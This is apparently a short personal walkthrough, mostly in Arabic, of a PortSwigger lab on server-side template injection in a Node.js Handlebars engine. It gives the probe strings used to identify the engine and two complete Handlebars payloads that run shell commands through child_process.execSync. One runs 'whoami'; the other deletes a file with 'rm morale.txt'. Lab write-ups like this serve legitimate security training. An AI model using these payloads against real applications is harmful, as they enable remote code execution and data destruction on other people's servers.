# Lab : Server-Side template injection in an unknown language with a documented exploit

https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

- الفكره من ال Lab ده انك تحاول تلاقي نوع الtemplate engine المصاب بSSTI وتدورله علي exploitation علي النت بس كان في تركه ان الموقع كان مصاب بس مش بيدعم العمليات الحسابيه يعني ال errorالي بيطلع كان كفيل باسبات الثغره مع بعض التاكيدات التانيه

```bash
1. ${{7*7}}${7*7}{{7*7}}{{=7*7}}${{7*7}}<%= 7*7 %>${7*7} ==> اول جزء هو الي اشتغل علشان اسب ان الengine من نوع javascript node.js

2. s ${{7*7}}${7*7}{{7*7}}{{=7*7}}${{7*7}} ==> ده الي اشتغل بس متنفزش هو اظهر error من الserver ده كان كفيل بس حبيت اتاكد 

3. {{this}} {{#with this}}{{lookup this "constructor"}}{{/with}} ==> اتنفز عادي واشتغل فا ده اكيد مصاب 

4. {{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

5. {{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
